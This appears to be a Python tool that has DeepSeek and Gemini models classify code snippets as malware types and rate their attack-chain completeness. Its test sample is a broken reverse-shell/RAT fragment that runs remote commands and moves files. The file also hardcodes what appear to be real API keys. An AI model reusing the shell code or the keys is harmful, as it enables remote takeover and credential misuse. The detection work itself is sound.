import os
from openai import OpenAI
import base64
from google import genai
from openai import types
import json


ASSERTION_PROMPT = """
Analyze the provided code snippet: {code_snippet}

Step 1: Determine "Malware Type" using the Matrix below.
Step 2: Perform "Dual-Axis Analysis" to assign the final Classification.

*** DUAL-AXIS EVALUATION (CRITICAL) ***

[AXIS 1: COMPONENT CHECK] (Static Analysis)
- **Goal:** Check if the code meets the "Components for Full" criteria in the Matrix (ignoring reachability).
- **Question:** Are ALL critical components for the identified Malware Type PRESENT in the code?
- **Result:** 
  - "Complete": The malicious logic is present.
  - "Incomplete": The critical malicious logic is **MISSING ENTIRELY**.
- **Action:** If "Incomplete", identify exactly what is missing (e.g., "Missing Network Logic").

[AXIS 2: REACHABILITY CHECK] (Control Flow Analysis)
- **Goal:** Check if the interpreter can executes the malicious components found in Axis 1.
- **Question:** Is the malicious logic **REACHABLE**? 
- **Result:** 
  - "Reachable": The malicious logic can be executed.
  - "Blocked": The malicious logic is unreachable.


*** ATTACK TYPE MATRIX (Definition of Components) ***

[Type A: InfoStealer / Keylogger / Spyware]
- Goal: Steal sensitive data (env vars, passwords, keystrokes) and send it to the attacker.
- Components for Full: Data collection + Network Exfiltration.

[Type B: Backdoor / RAT (Remote Access Trojan) / Reverse Shell]
- Goal: Provide unauthorized remote access or command execution.
- Components for Full: Command Execution + Connection Logic.


[Type C: Ransomware]
- Goal: Deny access to data via encryption until payment.
- Components for Full: File Encryption + Ransom Note/Demand generation.

[Type D: Wiper / Destructive Malware]
- Goal: Destroy/Encrypt essential data/files or exhaust resources (Availability Loss).
- Components for Full: Destructive logic (delete/overwrite) is present.

[Type E: Clipboard Hijacker / Clipper] 
- Goal: INTERCEPT and MODIFY user clipboard content (specifically crypto addresses) to redirect funds.
- Components for Full: Can read clipboard content and successfully replaces/overwrites the clipboard content with a hardcoded address.

[Type F: Malware Builder]
- Goal: Create infected artifacts.
- Components for Full: Can write/append the malicious payload (shellcode, script) into a strategic location (e.g., postinst, __init__.py, Main func) or reconstruct malicious artifact (e.g., `dpkg-deb -b`, `zip`, `compile`).

[Type G: Logic Bomb / Targeted Trigger]
- Goal: Execute malicious actions ONLY when specific conditions (Time, Hostname, Environment) are met.
- Components for Full: Connects a **Trigger** (Time/Env/Identity) to a **Malicious Payload** (Destruction/Theft). if condition met, harmful action executes.

[Type H: Uncategorized High-Impact Threat]
- Goal: Any malicious logic that does not fit A-F but causes **Severe Harm** to the system.
- Components for Full: The harmful action is fully implemented. The code successfully performs the harmful modification, download, destruction or exposure.


*** CLASSIFICATION FRAMEWORK (Final Decision) ***

Based on Axis 1 and Axis 2, classify the code:

1. **Full Attack Chain** (High Threat, Active)
   - [Axis 1]: **Complete** (Malicious modules exist).
   - [Axis 2]: **Reachable** (Logic flows correctly to the payload).
   - *Meaning:* The malware is fully functional and executable.

2. **Latent Attack Chain** (High Threat, Broken Implementation)
   - [Axis 1]: **Complete** (Malicious modules exist).
   - [Axis 2]: **Blocked** (Payload is unreachable).
   - *Meaning:* The attacker INTENDED a full attack, but failed in implementation. A single fix activates it.

3. **Core Attack Chain** (Medium Threat, Partial Capability)
   - [Axis 1]: **Incomplete**.
   - *Meaning:* The malware has SOME malicious capability but is INCOMPLETE.

4. **Fragmented Attack Chain**: (Low Threat, Inconclusive)
   - [Axis 1]: **Incomplete**.
   - *Meaning:* Suspicious snippets without coherent logic.
   
5. **Benign Artifact** (No Threat)
   - [Axis 1]: N/A.
   - [Axis 2]: N/A.
   - *Meaning:* Legitimate, explainable code.

*** RESPONSE FORMAT ***
Provide structured response:
- **Malware Type:** (e.g., "Type A: Keylogger")
- **Axis 1 (Components):** [Complete/Incomplete]
- **Missing Components:** [List the missing components OR "None"] (CRITICAL: If Incomplete, you MUST list what is missing).
- **Axis 2 (Reachability):** [Reachable/Blocked/N/A]
- **Classification:** "Full Attack Chain" | "Latent Attack Chain" | "Core Attack Chain" | "Fragmented Attack Chain" | "Benign Artifact".
- **Reasoning:** Explain based on Components and Reachability.
- **Potential Impact:** Describe specific damage (data loss, unauthorized access, financial theft, etc.).

"""

CHECK_PROMPT = """ 
You are the Supreme Quality Assurance Auditor. Analyze the LLM's assessment below for accuracy and consistency.

PREVIOUS RESPONSE: 
{response}

ORIGINAL CODE SNIPPET: 
{code_snippet}

*** AUDIT TASKS ***
1. **Verify "Missing Components":**
    If "Missing Components" are caused by syntax errors,missing imports,undefined variables, placeholders, missing error handling, or dummy values, treat and set "Missing_Components" to "None".

2. **Verify Logic Consistency (CRITICAL RULE):**
   - After applying Rule #1, check for consistency.
   - **IF "Missing_Components" is NOT None:** Classification MUST be "Core Attack Chain".
   - **IF "Missing_Components" is None:** Classification MUST be "Full Attack Chain" OR "Latent Attack Chain"(dependent on reachability).

3. **Verify Reachability (Latent vs Full):**
   - If Components are Complete ("Missing_Components" is None), check reachability.
   - Blocked = "Latent". Reachable = "Full".

4. **Generate Final Assessment JSON:**
   Respond in JSON format:
  "Malware_Type": "e.g., 'Type F: Clipboard Hijacker' or 'Type D: Wiper'",
  "Classification": "Full Attack Chain" | "Latent Attack Chain" | "Core Attack Chain" |  "Fragmented Attack Chain" | "Benign Artifact",
  "Components": "Complete" | "Incomplete",
  "Reachability": "Reachable" | "Blocked" | "N/A",
  "Missing_Components": "List of critical missing steps or 'None' if all components are present.",
  "Threat_Level": "High" | "Medium" | "Low",
  "Reasoning": "Explanation focusing on realized capability and ignored bugs.",
  "Potential_Impact": "Specific damage description."
"""

SYSTEM_PROMPT = """
ROLE:
You are an elite Supply Chain Security Expert using a "Dual-Axis" approach to classify malware threats.

CLASSIFICATION LOGIC (HIERARCHY):

1. **Full Attack Chain** (High Threat)
   - [Components]: **Complete**.
   - [Reachability]: **Reachable**.
   - *Meaning:* The malware is fully functional and active.

2. **Latent Attack Chain** (High Threat, Broken Logic)
   - [Components]: **Complete**.
   - [Reachability]: **Blocked**.
   - *Meaning:* The attacker INTENDED a full attack, but failed in implementation.

3. **Core Attack Chain** (Medium Threat, Partial Capability)
   - [Components]: **Missing**.
   - [Reachability]: N/A.
   - *Meaning:* The malware has SOME malicious capability but is INCOMPLETE.

4. **Fragmented Attack Chain**: (Low Threat, Inconclusive)
   - [Components]: **Isolated**.
   - [Reachability]: N/A.
   - *Meaning:* Suspicious snippets without coherent logic.
   
5. **Benign Artifact** (No Threat)
   - [Components]: N/A.
   - [Reachability]: N/A.
   - *Meaning:* Legitimate, explainable code.


"""




# gemini_key = "AIzaSyCcTlGHPZWzL2koyUPx8PM3jsOOh_rawL8" 

# AUDIT_SCHEMA = types.Schema(
#     type=types.Type.OBJECT,
#     properties={
#         "Classification": types.Schema(
#             type=types.Type.STRING,
#             enum=["Full Attack Chain", "Core Attack Chain", "Fragmented Attack Chain", "Benign Artifact"]
#         ),
#         "Malware_Type": types.Schema(
#             type=types.Type.STRING,
#             description="e.g., 'Type F: Clipboard Hijacker' or 'Type D: Wiper'"
#         ),
#         "Threat_Level": types.Schema(
#             type=types.Type.STRING,
#             enum=["High", "Medium", "Low"]
#         ),
#         "Reasoning": types.Schema(
#             type=types.Type.STRING,
#             description="Explanation focusing on realized capability and ignored bugs."
#         ),
#         "Potential_Impact": types.Schema(
#             type=types.Type.STRING,
#             description="Specific damage description."
#         )
#     },
#     required=["Classification", "Malware_Type", "Threat_Level", "Reasoning", "Potential_Impact"]
# )


# class Gemini_Evaluate:
#     def __init__(self, api_key=gemini_key, model="gemini-1.5-pro"):
#         self.client = genai.Client(api_key=api_key)
#         self.model = model
        
#     def malicious_analyze(self, code_snippet):
#         assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
#         contents = ASSERTION_PROMPT.format(code_snippet=code_snippet)
#         generate_content_config = types.GenerateContentConfig(
#             system_instruction=SYSTEM_PROMPT,
#             temperature=0.2
#         )
#         response_1 = self.client.models.generate_content(
#             model=self.model,
#             contents=contents,
#             config=generate_content_config,
#         )
#         assertion_response = response_1.text
        
#         check_contents = CHECK_PROMPT.format(response=assertion_response, code_snippet=code_snippet)
#         generate_content_config = types.GenerateContentConfig(
#             response_mime_type="application/json",
#             system_instruction=SYSTEM_PROMPT,
#             schema=AUDIT_SCHEMA,
#             temperature=0.1
#         )
#         response_2 = self.client.models.generate_content(
#             model=self.model,
#             contents=check_contents,
#             config=generate_content_config,
#         )
#         response = response_2.text
#         return response


class LLM_Evaluate:
    def __init__(self,api_key, base_url):
        self.client = OpenAI(
            api_key=api_key,
            base_url=base_url,
        )
        self.conversation_history = []

    def malware_analyze(self, code_snippet):
        assertion_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": assertion_prompt}
            ]
        )
        
        response_1 = completion.choices[0].message.content
        print("Initial LLM Response:")
        print(response_1)
        check_prompt = CHECK_PROMPT.format(response=response_1, code_snippet=code_snippet)
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": check_prompt}
            ],
            response_format={"type": "json_object"}
        )
        response_2 = completion.choices[0].message.content
        print("Audited LLM Response:")
        print(response_2)
        return json.loads(response_2)  # 解析JSON字符串为Python字典
        
    
    def sensitive_api_check(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to tell me if there are functions which can lead to malicious activities."
                "if there are, please list the sensitive functions. if not, please reply 'No sensitive functions found'."},
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content



    def reset_conversation(self, system_prompt=None):
        """清空会话历史，可选设置新的 system_prompt"""
        self.conversation_history = []
        if system_prompt:
            self.conversation_history.append({"role": "system", "content": system_prompt})

    def get_conversation_history(self):
        """返回当前会话历史的浅拷贝"""
        return list(getattr(self, "conversation_history", []))
    
    
    def malicious_assertion_check(self):
        self.conversation_history.append({"role": "user", "content": CHECK_PROMPT})
        
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        return completion.choices[0].message.content
    
    def malicious_assertion(self, code_snippet):
        user_prompt = ASSERTION_PROMPT.format(code_snippet=code_snippet)
        self.conversation_history.append({"role": "system", "content": SYSTEM_PROMPT})
        self.conversation_history.append({"role": "user", "content": user_prompt})
        completion = self.client.chat.completions.create(
            model="deepseek-v3-1-250821",
            messages=self.conversation_history
        )
        self.conversation_history.append({"role": "assistant", "content": completion.choices[0].message.content})
        return completion.choices[0].message.content
    
    
    def function_behavior_generate(self, code_snippet):
        completion = self.client.chat.completions.create(
            # 将推理接入点 <Model>替换为 Model ID
            model="deepseek-r1-250120",
            messages=[
                {"role": "system", "content": "You are a professional assistant about software supply chain security."
                "I will give you a code snippet and you need to generate its function behavior."
                },
                {"role": "user", "content": code_snippet}
            ]
        )
        return completion.choices[0].message.content

if __name__ == "__main__":
    code_snippet = '''
def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name ,"wb") as output_file:
        output_file.write(get_response.content)
def send_over_json(data):
    json_data = json.dumps(data)
    target.send(json_data.encode('utf-8'))
def recv_over_json():
    data = ""
            data = data + target.recv(1024).decode('utf-8')
            return json.loads(data)
def shell():
        command = recv_over_json()
        if command == 'q':
        elif command[:2] == 'cd':
                os.chdir(command[3:])
        elif command[:8] == 'download':
            with open(command[9:] ,'rb' ) as file:
                send_over_json(file.read())
        elif command[:6] == 'upload':
            with open(command[7:] ,'wb') as file:
                file_data = recv_over_json()
                file.write(base64.b64decode(file_data))
        elif command[:3] == "get":
                download(command[4:])
                send_over_json("[+] Downloaded File From Specified URL")
                send_over_json("[+] Failed to download that file")
        elif command[:5] == "start":
                subprocess.Popen(command[6:] ,shell=True)
                send_over_json("[+] %s started on victim's machine."%(command[6:]))
                send_over_json("[-] %s failed to start on victim's machine. "%(command[6:]))
            proc = subprocess.Popen(command ,shell=True ,stdout=subprocess.PIPE ,stderr=subprocess.PIPE ,stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            send_over_json(result.decode('utf-8'))

'''

    llm_evaluate = LLM_Evaluate(
        api_key="1d368dbf-5a67-448f-9356-49f9efa2fc13",
        base_url="https://ark.cn-beijing.volces.com/api/v3"
    )
    sensitive_api_result = llm_evaluate.malicious_assertion(code_snippet)
    print("LLM Malicious Assertion Result:")
    print(sensitive_api_result)
